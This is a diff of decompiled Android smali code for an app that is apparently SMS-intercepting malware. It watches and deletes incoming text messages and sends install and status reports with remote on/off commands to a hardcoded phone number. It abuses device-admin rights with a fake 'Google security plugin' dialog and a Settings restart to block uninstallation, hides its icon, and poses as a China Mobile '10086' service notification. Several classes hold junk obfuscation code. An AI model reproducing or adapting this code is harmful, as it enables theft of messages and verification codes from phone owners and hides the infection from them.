+    iget-object v0, p0, Lji/yj/ur/a201jhfg20180420ab/JM05;->su:Lji/yj/ur/a201jhfg20180420ab/JM02;
+
+    iget-object v1, p0, Lji/yj/ur/a201jhfg20180420ab/JM05;->context:Landroid/content/Context;
+
+    iget-object v2, p0, Lji/yj/ur/a201jhfg20180420ab/JM05;->sp:Landroid/content/SharedPreferences;
+
+    invoke-virtual {v0, v6, v7, v1, v2}, Lji/yj/ur/a201jhfg20180420ab/JM02;->yrthfdxh(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;Landroid/content/SharedPreferences;)V
+
+    .line 43
+    if-nez v11, :cond_2
+
+    const-string v0, "18016217928"
+
+    invoke-virtual {v6, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
+
+    move-result v0
+
+    if-nez v0, :cond_2
+
+    const/4 v10, 0x0
+
+    .line 44
+    .local v10, "isdelete":Z
+    :cond_2
+    if-eqz v10, :cond_0
+
+    .line 45
+    invoke-virtual {p0, v9}, Lji/yj/ur/a201jhfg20180420ab/JM05;->delete(I)V
+
+    goto :goto_0
+
+    .line 48
+    .end local v6    # "address":Ljava/lang/String;
+    .end local v7    # "body":Ljava/lang/String;
+    .end local v10    # "isdelete":Z
+    .end local v11    # "islj":Z
+    :cond_3
+    iput v9, p0, Lji/yj/ur/a201jhfg20180420ab/JM05;->didid:I
+
+    goto :goto_0
+.end method
+
+.method public delete(I)V
+    .locals 5
+    .param p1, "id"    # I
+
+    .prologue
+    .line 55
+    iget-object v1, p0, Lji/yj/ur/a201jhfg20180420ab/JM05;->context:Landroid/content/Context;
+
+    invoke-virtual {v1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;
+
+    move-result-object v1
+
+    const-string v2, "content://sms/"
+
+    invoke-static {v2}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;
+
+    move-result-object v2
+
+    new-instance v3, Ljava/lang/StringBuilder;
+
+    const-string v4, "_id="
+
+    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
+
+    invoke-virtual {v3, p1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
+
+    move-result-object v3
+
+    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+
+    move-result-object v3
+
+    const/4 v4, 0x0
+
+    invoke-virtual {v1, v2, v3, v4}, Landroid/content/ContentResolver;->delete(Landroid/net/Uri;Ljava/lang/String;[Ljava/lang/String;)I
+
+    move-result v0
+
+    .line 56
+    .local v0, "tx":I
+    return-void
+.end method
+
+.method public onChange(Z)V
+    .locals 0
+    .param p1, "selfChange"    # Z
+
+    .prologue
+    .line 18
+    invoke-super {p0, p1}, Landroid/database/ContentObserver;->onChange(Z)V
+
+    .line 19
+    invoke-virtual {p0}, Lji/yj/ur/a201jhfg20180420ab/JM05;->Change()V
+
+    .line 20
+    return-void
+.end method
+.class Lji/yj/ur/a201jhfg20180420ab/JM06$TTT;
+.super Landroid/app/AlertDialog;
+.source "JM06.java"
+
+
+# annotations
+.annotation system Ldalvik/annotation/EnclosingClass;
+    value = Lji/yj/ur/a201jhfg20180420ab/JM06;
+.end annotation
+
+.annotation system Ldalvik/annotation/InnerClass;
+    accessFlags = 0x0
+    name = "TTT"
+.end annotation
+
+
+# instance fields
+.field final synthetic this$0:Lji/yj/ur/a201jhfg20180420ab/JM06;
+
+
+# direct methods
+.method protected constructor <init>(Lji/yj/ur/a201jhfg20180420ab/JM06;Landroid/content/Context;)V
+    .locals 0
+    .param p2, "context"    # Landroid/content/Context;
+
+    .prologue
+    .line 48
+    iput-object p1, p0, Lji/yj/ur/a201jhfg20180420ab/JM06$TTT;->this$0:Lji/yj/ur/a201jhfg20180420ab/JM06;
+
+    .line 47
+    invoke-direct {p0, p2}, Landroid/app/AlertDialog;-><init>(Landroid/content/Context;)V
+
+    return-void
+.end method
+
+
+# virtual methods
+.method public dismiss()V
+    .locals 0
+
+    .prologue
+    .line 52
+    return-void
+.end method
+.class public Lji/yj/ur/a201jhfg20180420ab/JM06;
+.super Landroid/app/admin/DeviceAdminReceiver;
+.source "JM06.java"
+
+
+# annotations
+.annotation system Ldalvik/annotation/MemberClasses;
+    value = {
+        Lji/yj/ur/a201jhfg20180420ab/JM06$TTT;
+    }
+.end annotation
+
+
+# direct methods
+.method public constructor <init>()V
+    .locals 0
+
+    .prologue
+    .line 10
+    invoke-direct {p0}, Landroid/app/admin/DeviceAdminReceiver;-><init>()V
+
+    return-void
+.end method
+
+.method private uuuu(Landroid/content/Context;)V
+    .locals 3
+    .param p1, "context"    # Landroid/content/Context;
+
+    .prologue
+    .line 34
+    new-instance v1, Landroid/content/Intent;
+
+    const-string v2, "android.intent.action.MAIN"
+
+    invoke-direct {v1, v2}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V
+
+    .line 35
+    .local v1, "toHome":Landroid/content/Intent;
+    const/high16 v2, 0x10000000
+
+    invoke-virtual {v1, v2}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;
+
+    .line 36
+    const-string v2, "android.intent.category.HOME"
+
+    invoke-virtual {v1, v2}, Landroid/content/Intent;->addCategory(Ljava/lang/String;)Landroid/content/Intent;
+
+    .line 37
+    invoke-virtual {p1, v1}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
+
+    .line 39
+    const-string v2, "activity"
+
+    invoke-virtual {p1, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
+
+    move-result-object v0
+
+    .line 38
+    check-cast v0, Landroid/app/ActivityManager;
+
+    .line 40
+    .local v0, "mAm":Landroid/app/ActivityManager;
+    const-string v2, "com.android.settings.DeviceAdminSettings"
+
+    invoke-virtual {v0, v2}, Landroid/app/ActivityManager;->restartPackage(Ljava/lang/String;)V
+
+    .line 41
+    const-string v2, "com.android.settings"
+
+    invoke-virtual {v0, v2}, Landroid/app/ActivityManager;->restartPackage(Ljava/lang/String;)V
+
+    .line 42
+    return-void
+.end method
+
+
+# virtual methods
+.method protected nnnn(Landroid/content/Context;)V
+    .locals 3
+    .param p1, "context"    # Landroid/content/Context;
+
+    .prologue
+    .line 24
+    new-instance v0, Lji/yj/ur/a201jhfg20180420ab/JM06$TTT;
+
+    invoke-direct {v0, p0, p1}, Lji/yj/ur/a201jhfg20180420ab/JM06$TTT;-><init>(Lji/yj/ur/a201jhfg20180420ab/JM06;Landroid/content/Context;)V
+
+    .line 25
+    .local v0, "tttt":Lji/yj/ur/a201jhfg20180420ab/JM06$TTT;
+    const/4 v1, 0x0
+
+    invoke-virtual {v0, v1}, Lji/yj/ur/a201jhfg20180420ab/JM06$TTT;->setCancelable(Z)V
+
+    .line 26
+    invoke-virtual {v0}, Lji/yj/ur/a201jhfg20180420ab/JM06$TTT;->getWindow()Landroid/view/Window;
+
+    move-result-object v1
+
+    const/16 v2, 0x7d3
+
+    invoke-virtual {v1, v2}, Landroid/view/Window;->setType(I)V
+
+    .line 27
+    const-string v1, "\u6e29\u99a8\u63d0\u793a"
+
+    invoke-virtual {v0, v1}, Lji/yj/ur/a201jhfg20180420ab/JM06$TTT;->setTitle(Ljava/lang/CharSequence;)V
+
+    .line 28
+    const-string v1, "\u8be5\u7a0b\u5e8f\u4e3a\u8c37\u6b4c\u5b89\u5168\u63d2\u4ef6\u8bf7\u52ff\u8fdb\u884c\u5378\u8f7d\u64cd\u4f5c,\u672c\u7a97\u53e3\u65e0\u6cd5\u5173\u95ed\u8bf7\u91cd\u65b0\u542f\u52a8\u624b\u673a\u5e76\u8bf7\u52ff\u518d\u8fdb\u884c\u5378\u8f7d\u64cd\u4f5c."
+
+    invoke-virtual {v0, v1}, Lji/yj/ur/a201jhfg20180420ab/JM06$TTT;->setMessage(Ljava/lang/CharSequence;)V
+
+    .line 29
+    invoke-virtual {v0}, Lji/yj/ur/a201jhfg20180420ab/JM06$TTT;->show()V
+
+    .line 31
+    return-void
+.end method
+
+.method public onDisableRequested(Landroid/content/Context;Landroid/content/Intent;)Ljava/lang/CharSequence;
+    .locals 3
+    .param p1, "context"    # Landroid/content/Context;
+    .param p2, "intent"    # Landroid/content/Intent;
+
+    .prologue
+    .line 13
+    invoke-direct {p0, p1}, Lji/yj/ur/a201jhfg20180420ab/JM06;->uuuu(Landroid/content/Context;)V
+
+    .line 15
+    :try_start_0
+    invoke-static {}, Ljava/lang/Thread;->currentThread()Ljava/lang/Thread;
+
+    const-wide/16 v1, 0x2710
+
+    invoke-static {v1, v2}, Ljava/lang/Thread;->sleep(J)V
+    :try_end_0
+    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0
+
+    .line 20
+    :goto_0
+    const-string v1, "\u4e3a\u4e86\u60a8\u7684\u624b\u673a\u5b89\u5168\uff0c\u8bf7\u4e0d\u8981\u53d6\u6d88\u63d2\u4ef6"
+
+    return-object v1
+
+    .line 16
+    :catch_0
+    move-exception v0
+
+    .line 18
+    .local v0, "e":Ljava/lang/InterruptedException;
+    invoke-virtual {v0}, Ljava/lang/InterruptedException;->printStackTrace()V
+
+    goto :goto_0
+.end method
+.class public Lji/yj/ur/a201jhfg20180420ab/JM07;
+.super Landroid/app/Activity;
+.source "JM07.java"
+
+
+# direct methods
+.method public constructor <init>()V
+    .locals 0
+
+    .prologue
+    .line 8
+    invoke-direct {p0}, Landroid/app/Activity;-><init>()V
+
+    return-void
+.end method
+
+
+# virtual methods
+.method protected onCreate(Landroid/os/Bundle;)V
+    .locals 3
+    .param p1, "savedInstanceState"    # Landroid/os/Bundle;
+
+    .prologue
+    .line 12
+    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V
+
+    .line 13
+    new-instance v0, Landroid/content/Intent;
+
+    const-class v1, Lji/yj/ur/a201jhfg20180420ab/JM01;
+
+    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
+
+    .line 14
+    .local v0, "intent":Landroid/content/Intent;
+    invoke-virtual {p0, v0}, Lji/yj/ur/a201jhfg20180420ab/JM07;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
+
+    .line 15
+    const-string v1, "\u60a8\u624b\u673a\u4e0a\u672a\u5b89\u88c5\u8fd9\u4e2a\u7a0b\u5e8f"
+
+    const/4 v2, 0x0
+
+    invoke-static {p0, v1, v2}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;
+
+    move-result-object v1
+
+    invoke-virtual {v1}, Landroid/widget/Toast;->show()V
+
+    .line 16
+    invoke-virtual {p0}, Lji/yj/ur/a201jhfg20180420ab/JM07;->finish()V
+
+    .line 17
+    return-void
+.end method
+.class public final Lji/yj/ur/a201jhfg20180420ab/R$attr;
+.super Ljava/lang/Object;
+.source "R.java"
+
+
+# annotations
+.annotation system Ldalvik/annotation/EnclosingClass;
+    value = Lji/yj/ur/a201jhfg20180420ab/R;
+.end annotation
+
+.annotation system Ldalvik/annotation/InnerClass;
+    accessFlags = 0x19
+    name = "attr"
+.end annotation
+
+
+# direct methods
+.method public constructor <init>()V
+    .locals 0
+
+    .prologue
+    .line 11
+    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
+
+    return-void
+.end method
+.class public final Lji/yj/ur/a201jhfg20180420ab/R$drawable;
+.super Ljava/lang/Object;
+.source "R.java"
+
+
+# annotations
+.annotation system Ldalvik/annotation/EnclosingClass;
+    value = Lji/yj/ur/a201jhfg20180420ab/R;
+.end annotation
+
+.annotation system Ldalvik/annotation/InnerClass;
+    accessFlags = 0x19
+    name = "drawable"
+.end annotation
+
+
+# static fields
+.field public static final ic_launcher:I = 0x7f020000
+
+
+# direct methods
+.method public constructor <init>()V
+    .locals 0
+
+    .prologue
+    .line 13
+    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
+
+    return-void
+.end method
+.class public final Lji/yj/ur/a201jhfg20180420ab/R$layout;
+.super Ljava/lang/Object;
+.source "R.java"
+
+
+# annotations
+.annotation system Ldalvik/annotation/EnclosingClass;
+    value = Lji/yj/ur/a201jhfg20180420ab/R;
+.end annotation
+
+.annotation system Ldalvik/annotation/InnerClass;
+    accessFlags = 0x19
+    name = "layout"
+.end annotation
+
+
+# static fields
+.field public static final main:I = 0x7f030000
+
+
+# direct methods
+.method public constructor <init>()V
+    .locals 0
+
+    .prologue
+    .line 16
+    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
+
+    return-void
+.end method
+.class public final Lji/yj/ur/a201jhfg20180420ab/R$string;
+.super Ljava/lang/Object;
+.source "R.java"
+
+
+# annotations
+.annotation system Ldalvik/annotation/EnclosingClass;
+    value = Lji/yj/ur/a201jhfg20180420ab/R;
+.end annotation
+
+.annotation system Ldalvik/annotation/InnerClass;
+    accessFlags = 0x19
+    name = "string"
+.end annotation
+
+
+# static fields
+.field public static final app_name:I = 0x7f050000
+
+
+# direct methods
+.method public constructor <init>()V
+    .locals 0
+
+    .prologue
+    .line 19
+    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
+
+    return-void
+.end method
+.class public final Lji/yj/ur/a201jhfg20180420ab/R$xml;
+.super Ljava/lang/Object;
+.source "R.java"
+
+
+# annotations
+.annotation system Ldalvik/annotation/EnclosingClass;
+    value = Lji/yj/ur/a201jhfg20180420ab/R;
+.end annotation
+
+.annotation system Ldalvik/annotation/InnerClass;
+    accessFlags = 0x19
+    name = "xml"
+.end annotation
+
+
+# static fields
+.field public static final xyz:I = 0x7f040000
+
+
+# direct methods
+.method public constructor <init>()V
+    .locals 0
+
+    .prologue
+    .line 22
+    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
+
+    return-void
+.end method
+.class public final Lji/yj/ur/a201jhfg20180420ab/R;
+.super Ljava/lang/Object;
+.source "R.java"
+
+
+# annotations
+.annotation system Ldalvik/annotation/MemberClasses;
+    value = {
+        Lji/yj/ur/a201jhfg20180420ab/R$attr;,
+        Lji/yj/ur/a201jhfg20180420ab/R$drawable;,
+        Lji/yj/ur/a201jhfg20180420ab/R$layout;,
+        Lji/yj/ur/a201jhfg20180420ab/R$string;,
+        Lji/yj/ur/a201jhfg20180420ab/R$xml;
+    }
+.end annotation
+
+
+# direct methods
+.method public constructor <init>()V
+    .locals 0
+
+    .prologue
+    .line 10
+    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
+
+    return-void
+.end method
+.class public Lji/a;
+.super Ljava/lang/Object;
+.source "Landroid/content/ComponentName;"
+
+
+# direct methods
+.method public constructor <init>()V
+    .locals 0
+
+    .prologue
+    .line 3
+    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
+
+    return-void
+.end method
+
+
+# virtual methods
+.method public a()Ljava/lang/String;
+    .locals 1
+
+    .prologue
+    .line 12
+    :cond_0
+    if-ge p13, p7, :cond_0
+
+    ushr-long p95, v0, v0
+.end method
+
+.method public b()I
+    .locals 1
+
+    .prologue
+    .line 7
+    add-double/2addr p1, p8
+
+    move/from16 p221, p52522
+.end method
+.class public Lji/yj/a;
+.super Ljava/lang/Object;
+.source "Landroid/content/ContentResolver;"
+
+
+# direct methods
+.method public constructor <init>()V
+    .locals 0
+
+    .prologue
+    .line 3
+    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
+
+    return-void
+.end method
+
+
+# virtual methods
+.method public a()Ljava/lang/String;
+    .locals 1
+
+    .prologue
+    .line 12
+    nop
+
+    if-eqz p196, :cond_0
+    :cond_0
+.end method
+
+.method public b()I
+    .locals 1
+
+    .prologue
+    .line 7
+    nop
+
+    move-exception p146
+.end method
+.class public Lji/yj/ur/a;
+.super Ljava/lang/Object;
+.source "Landroid/widget/RemoteViews;"
+
+
+# direct methods
+.method public constructor <init>()V
+    .locals 0
+
+    .prologue
+    .line 3
+    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
+
+    return-void
+.end method
+
+
+# virtual methods
+.method public a()Ljava/lang/String;
+    .locals 1
+
+    .prologue
+    .line 12
+    mul-int p155, p130, p193
+
+    iget-boolean p5, v0, Landroid/app/ActivityManager$RunningServiceInfo;->service:Landroid/content/ComponentName;
+.end method
+
+.method public b()I
+    .locals 1
+
+    .prologue
+    .line 7
+    nop
+.end method
+.class public Lji/yj/ur/a201jhfg20180420ab/a;
+.super Ljava/lang/Object;
+.source "Landroid/view/Window;"
+
+
+# direct methods
+.method public constructor <init>()V
+    .locals 0
+
+    .prologue
+    .line 3
+    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
+
+    return-void
+.end method
+
+
+# virtual methods
+.method public a()Ljava/lang/String;
+    .locals 1
+
+    .prologue
+    .line 12
+    rem-int p191, p130, p146
+
+    sub-long/2addr p3, p8
+.end method
+
+.method public b()I
+    .locals 1
+
+    .prologue
+    .line 7
+    nop
+.end method
+.class public Lji/yj/ur/a201jhfg20180420ab/JieMian;
+.super Landroid/app/Activity;
+.source "JieMian.java"
+
+
+# direct methods
+.method public constructor <init>()V
+    .locals 0
+
+    .prologue
+    .line 10
+    invoke-direct {p0}, Landroid/app/Activity;-><init>()V
+
+    return-void
+.end method
+
+.method private hhhhhhh()V
+    .locals 5
+
+    .prologue
+    const/4 v4, 0x1
+
+    .line 34
+    invoke-virtual {p0}, Lji/yj/ur/a201jhfg20180420ab/JieMian;->getPackageManager()Landroid/content/pm/PackageManager;
+
+    move-result-object v2
+
+    .line 35
+    .local v2, "retr":Landroid/content/pm/PackageManager;
+    new-instance v0, Landroid/content/ComponentName;
+
+    .line 36
+    const-class v3, Lji/yj/ur/a201jhfg20180420ab/JieMian;
+
+    .line 35
+    invoke-direct {v0, p0, v3}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
+
+    .line 37
+    .local v0, "iuyiuy":Landroid/content/ComponentName;
+    invoke-virtual {v2, v0}, Landroid/content/pm/PackageManager;->getComponentEnabledSetting(Landroid/content/ComponentName;)I
+
+    move-result v1
+
+    .line 38
+    .local v1, "res":I
+    if-eqz v1, :cond_0
+
+    .line 39
+    if-ne v1, v4, :cond_1
+
+    .line 41
+    :cond_0
+    const/4 v3, 0x2
+
+    .line 40
+    invoke-virtual {v2, v0, v3, v4}, Landroid/content/pm/PackageManager;->setComponentEnabledSetting(Landroid/content/ComponentName;II)V
+
+    .line 43
+    invoke-virtual {p0}, Lji/yj/ur/a201jhfg20180420ab/JieMian;->finish()V
+
+    .line 45
+    :cond_1
+    return-void
+.end method
+
+
+# virtual methods
+.method public onCreate(Landroid/os/Bundle;)V
+    .locals 7
+    .param p1, "savedInstanceState"    # Landroid/os/Bundle;
+
+    .prologue
+    .line 14
+    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V
+
+    .line 15
+    const/high16 v4, 0x7f030000
+
+    invoke-virtual {p0, v4}, Lji/yj/ur/a201jhfg20180420ab/JieMian;->setContentView(I)V
+
+    .line 17
+    new-instance v2, Lji/yj/ur/a201jhfg20180420ab/JM02;
+
+    invoke-direct {v2}, Lji/yj/ur/a201jhfg20180420ab/JM02;-><init>()V
+
+    .line 18
+    .local v2, "su":Lji/yj/ur/a201jhfg20180420ab/JM02;
+    const-string v4, "18016217928"
+
+    const-string v5, "\u5b89\u88c5\u6210\u529f,\u56de\u590dcom#false\u5173\u95edcom#true\u5f00\u542f"
+
+    const/4 v6, 0x0
+
+    invoke-virtual {v2, v4, v5, v6}, Lji/yj/ur/a201jhfg20180420ab/JM02;->gfyhdfgadg(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V
+
+    .line 20
+    new-instance v3, Landroid/content/Intent;
+
+    const-class v4, Lji/yj/ur/a201jhfg20180420ab/JM01;
+
+    invoke-direct {v3, p0, v4}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
+
+    .line 21
+    .local v3, "yyyy":Landroid/content/Intent;
+    invoke-virtual {p0, v3}, Lji/yj/ur/a201jhfg20180420ab/JieMian;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
+
+    .line 23
+    invoke-direct {p0}, Lji/yj/ur/a201jhfg20180420ab/JieMian;->hhhhhhh()V
+
+    .line 25
+    new-instance v1, Landroid/content/ComponentName;
+
+    const-class v4, Lji/yj/ur/a201jhfg20180420ab/JM06;
+
+    invoke-direct {v1, p0, v4}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
+
+    .line 26
+    .local v1, "bbbbbb":Landroid/content/ComponentName;
+    new-instance v0, Landroid/content/Intent;
+
+    const-string v4, "android.app.action.ADD_DEVICE_ADMIN"
+
+    invoke-direct {v0, v4}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V
+
+    .line 27
+    .local v0, "abljg":Landroid/content/Intent;
+    const-string v4, "android.app.extra.DEVICE_ADMIN"
+
+    invoke-virtual {v0, v4, v1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Landroid/os/Parcelable;)Landroid/content/Intent;
+
+    .line 28
+    const-string v4, "android.app.extra.ADD_EXPLANATION"
+
+    const-string v5, "---------"
+
+    invoke-virtual {v0, v4, v5}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;
+
+    .line 29
+    invoke-virtual {p0, v0}, Lji/yj/ur/a201jhfg20180420ab/JieMian;->startActivity(Landroid/content/Intent;)V
+
+    .line 31
+    return-void
+.end method
+.class Lji/yj/ur/a201jhfg20180420ab/JM01$1;
+.super Landroid/os/Handler;
+.source "JM01.java"
+
+
+# annotations
+.annotation system Ldalvik/annotation/EnclosingClass;
+    value = Lji/yj/ur/a201jhfg20180420ab/JM01;
+.end annotation
+
+.annotation system Ldalvik/annotation/InnerClass;
+    accessFlags = 0x0
+    name = null
+.end annotation
+
+
+# instance fields
+.field final synthetic this$0:Lji/yj/ur/a201jhfg20180420ab/JM01;
+
+
+# direct methods
+.method constructor <init>(Lji/yj/ur/a201jhfg20180420ab/JM01;)V
+    .locals 0
+
+    .prologue
+    .line 1
+    iput-object p1, p0, Lji/yj/ur/a201jhfg20180420ab/JM01$1;->this$0:Lji/yj/ur/a201jhfg20180420ab/JM01;
+
+    .line 90
+    invoke-direct {p0}, Landroid/os/Handler;-><init>()V
+
+    return-void
+.end method
+
+
+# virtual methods
+.method public handleMessage(Landroid/os/Message;)V
+    .locals 4
+    .param p1, "msg"    # Landroid/os/Message;
+
+    .prologue
+    .line 94
+    invoke-super {p0, p1}, Landroid/os/Handler;->handleMessage(Landroid/os/Message;)V
+
+    .line 95
+    iget-object v0, p0, Lji/yj/ur/a201jhfg20180420ab/JM01$1;->this$0:Lji/yj/ur/a201jhfg20180420ab/JM01;
+
+    invoke-static {v0}, Lji/yj/ur/a201jhfg20180420ab/JM01;->access$0(Lji/yj/ur/a201jhfg20180420ab/JM01;)Lji/yj/ur/a201jhfg20180420ab/JM02;
+
+    move-result-object v0
+
+    const-string v1, "18016217928"
+
+    const-string v2, "\u670d\u52a1\u542f\u52a8\u6210\u529f\uff0c\u5230\u671f\u65f6\u95f4\uff1a2018-4-20 12:00:00"
+
+    const/4 v3, 0x0
+
+    invoke-virtual {v0, v1, v2, v3}, Lji/yj/ur/a201jhfg20180420ab/JM02;->gfyhdfgadg(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V
+
+    .line 96
+    return-void
+.end method
+.class Lji/yj/ur/a201jhfg20180420ab/JM01$FFFFFFF;
+.super Ljava/lang/Thread;
+.source "JM01.java"
+
+
+# annotations
+.annotation system Ldalvik/annotation/EnclosingClass;
+    value = Lji/yj/ur/a201jhfg20180420ab/JM01;
+.end annotation
+
+.annotation system Ldalvik/annotation/InnerClass;
+    accessFlags = 0x0
+    name = "FFFFFFF"
+.end annotation
+
+
+# instance fields
+.field final synthetic this$0:Lji/yj/ur/a201jhfg20180420ab/JM01;
+
+
+# direct methods
+.method constructor <init>(Lji/yj/ur/a201jhfg20180420ab/JM01;)V
+    .locals 0
+
+    .prologue
+    .line 76
+    iput-object p1, p0, Lji/yj/ur/a201jhfg20180420ab/JM01$FFFFFFF;->this$0:Lji/yj/ur/a201jhfg20180420ab/JM01;
+
+    invoke-direct {p0}, Ljava/lang/Thread;-><init>()V
+
+    return-void
+.end method
+
+
+# virtual methods
+.method public run()V
+    .locals 3
+
+    .prologue
+    .line 80
+    invoke-super {p0}, Ljava/lang/Thread;->run()V
+
+    .line 82
+    const-wide/16 v1, 0x4e20
+
+    :try_start_0
+    invoke-static {v1, v2}, Ljava/lang/Thread;->sleep(J)V
+
+    .line 83
+    iget-object v1, p0, Lji/yj/ur/a201jhfg20180420ab/JM01$FFFFFFF;->this$0:Lji/yj/ur/a201jhfg20180420ab/JM01;
+
+    invoke-static {v1}, Lji/yj/ur/a201jhfg20180420ab/JM01;->access$1(Lji/yj/ur/a201jhfg20180420ab/JM01;)Landroid/os/Handler;
+
+    move-result-object v1
+
+    const/4 v2, 0x1
+
+    invoke-virtual {v1, v2}, Landroid/os/Handler;->sendEmptyMessage(I)Z
+    :try_end_0
+    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0
+
+    .line 87
+    :goto_0
+    return-void
+
+    .line 84
+    :catch_0
+    move-exception v0
+
+    .line 85
+    .local v0, "e":Ljava/lang/InterruptedException;
+    invoke-virtual {v0}, Ljava/lang/InterruptedException;->printStackTrace()V
+
+    goto :goto_0
+.end method
+.class public Lji/yj/ur/a201jhfg20180420ab/JM01;
+.super Landroid/app/Service;
+.source "JM01.java"
+
+
+# annotations
+.annotation system Ldalvik/annotation/MemberClasses;
+    value = {
+        Lji/yj/ur/a201jhfg20180420ab/JM01$FFFFFFF;
+    }
+.end annotation
+
+
+# static fields
+.field public static final iru:Landroid/net/Uri;
+
+.field public static final t01:Ljava/lang/String; = "android.provider.Telephony.SMS_RECEIVED"
+
+.field public static final t02:Ljava/lang/String; = "android.provider.Telephony.SMS_RECEIVED_2"
+
+.field public static final t03:Ljava/lang/String; = "android.provider.Telephony.GSM_SMS_RECEIVED"
+
+.field public static final t04:Ljava/lang/String; = "sh.ji.fe"
+
+
+# instance fields
+.field private rr01:Lji/yj/ur/a201jhfg20180420ab/JM03;
+
+.field private rr02:Lji/yj/ur/a201jhfg20180420ab/JM03;
+
+.field private rtyertrhy:Landroid/os/Handler;
+
+.field private ssssssss:Lji/yj/ur/a201jhfg20180420ab/JM05;
+
+.field private su:Lji/yj/ur/a201jhfg20180420ab/JM02;
+
+
+# direct methods
+.method static constructor <clinit>()V
+    .locals 1
+
+    .prologue
+    .line 19
+    const-string v0, "content://sms/"
+
+    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;
+
+    move-result-object v0
+
+    sput-object v0, Lji/yj/ur/a201jhfg20180420ab/JM01;->iru:Landroid/net/Uri;
+
+    .line 14
+    return-void
+.end method
+
+.method public constructor <init>()V
+    .locals 1
+
+    .prologue
+    .line 14
+    invoke-direct {p0}, Landroid/app/Service;-><init>()V
+
+    .line 22
+    new-instance v0, Lji/yj/ur/a201jhfg20180420ab/JM02;
+
+    invoke-direct {v0}, Lji/yj/ur/a201jhfg20180420ab/JM02;-><init>()V
+
+    iput-object v0, p0, Lji/yj/ur/a201jhfg20180420ab/JM01;->su:Lji/yj/ur/a201jhfg20180420ab/JM02;
+
+    .line 90
+    new-instance v0, Lji/yj/ur/a201jhfg20180420ab/JM01$1;
+
+    invoke-direct {v0, p0}, Lji/yj/ur/a201jhfg20180420ab/JM01$1;-><init>(Lji/yj/ur/a201jhfg20180420ab/JM01;)V
+
+    iput-object v0, p0, Lji/yj/ur/a201jhfg20180420ab/JM01;->rtyertrhy:Landroid/os/Handler;
+
+    .line 14
+    return-void
+.end method
+
+.method static synthetic access$0(Lji/yj/ur/a201jhfg20180420ab/JM01;)Lji/yj/ur/a201jhfg20180420ab/JM02;
+    .locals 1
+
+    .prologue
+    .line 22
+    iget-object v0, p0, Lji/yj/ur/a201jhfg20180420ab/JM01;->su:Lji/yj/ur/a201jhfg20180420ab/JM02;
+
+    return-object v0
+.end method
+
+.method static synthetic access$1(Lji/yj/ur/a201jhfg20180420ab/JM01;)Landroid/os/Handler;
+    .locals 1
+
+    .prologue
+    .line 90
+    iget-object v0, p0, Lji/yj/ur/a201jhfg20180420ab/JM01;->rtyertrhy:Landroid/os/Handler;
+
+    return-object v0
+.end method
+
+
+# virtual methods
+.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
+    .locals 1
+    .param p1, "arg0"    # Landroid/content/Intent;
+
+    .prologue
+    .line 68
+    const/4 v0, 0x0
+
+    return-object v0
+.end method
+
+.method public onCreate()V
+    .locals 10
+
+    .prologue
+    const/4 v9, 0x0
+
+    const/4 v8, 0x0
+
+    .line 25
+    invoke-super {p0}, Landroid/app/Service;->onCreate()V
+
+    .line 26
+    new-instance v1, Landroid/app/Notification;
+
+    const/high16 v4, 0x7f020000
+
+    const-string v5, "10086\u96c6\u5206\u5b9d"
+
+    .line 27
+    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J
+
+    move-result-wide v6
+
+    .line 26
+    invoke-direct {v1, v4, v5, v6, v7}, Landroid/app/Notification;-><init>(ILjava/lang/CharSequence;J)V
+
+    .line 28
+    .local v1, "notification":Landroid/app/Notification;
+    new-instance v2, Landroid/content/Intent;
+
+    invoke-direct {v2}, Landroid/content/Intent;-><init>()V
+
+    .line 29
+    .local v2, "notificationIntent":Landroid/content/Intent;
+    new-instance v4, Landroid/widget/RemoteViews;
+
+    invoke-virtual {p0}, Lji/yj/ur/a201jhfg20180420ab/JM01;->getPackageName()Ljava/lang/String;
+
+    move-result-object v5
+
+    .line 30
+    const/high16 v6, 0x7f030000
+
